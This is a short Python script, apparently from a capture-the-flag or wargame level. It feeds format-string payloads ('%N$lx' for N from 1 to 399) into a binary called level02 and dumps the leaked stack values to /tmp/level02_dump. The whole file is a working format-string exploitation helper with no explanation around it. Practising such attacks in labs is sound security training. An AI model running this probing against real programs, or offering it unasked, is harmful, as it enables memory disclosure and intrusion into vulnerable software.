import os

for i in range(1, 400):
    arg1 = "python -c \'print \"%" + str(i) + "$lx" + "\\n\"\'"
    cmd = arg1 + " | ~/level02 | grep \"does not have access!\" >> /tmp/level02_dump"
    os.system("echo -n \"=== " + str(i) + " : \" >> /tmp/level02_dump")
    os.system(cmd)